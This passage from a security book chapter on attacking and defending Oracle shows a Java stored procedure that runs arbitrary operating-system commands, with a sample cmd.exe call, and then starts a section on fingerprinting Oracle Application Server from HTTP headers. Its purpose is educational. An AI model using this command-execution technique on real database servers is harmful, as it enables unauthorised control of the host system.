# Attacking and Defending Oracle • Chapter 13

```
class JExecCmd {
    public static void main(String args[]) {
        try {
            Process p = Runtime.getRuntime().exec(args[0]);
        } catch (IOException e) {
            System.out.println(e.getMessage());
            e.printStackTrace();
        }
    }
}
```

Once created, it's then possible to execute operating system commands through Java Stored Procedures: exec jexeccmd ('c:\windows\system32\cmd.exe /c dir > c:\java2.txt');

This vulnerability allows a remote user with dangerous Java privileges to execute commands on the operating system that is running.

# # Attacking the Oracle Application Server

Oracle produces a Web front end to bolt into their database server. Although this Application server is based on Apache, famed for its security, it seems as soon as you layer any decent functionality on top it becomes insecure. This section details issues in Oracle's Application Server.

Although Oracle Application Server is based on Apache, Oracle Application Server can be identified by examining the server field in the HTTP header. The server field returns hints about the version installed and the components installed, but it does not clearly define the patch level.

![](bbox=[0.707, 0.946, 0.932, 0.966])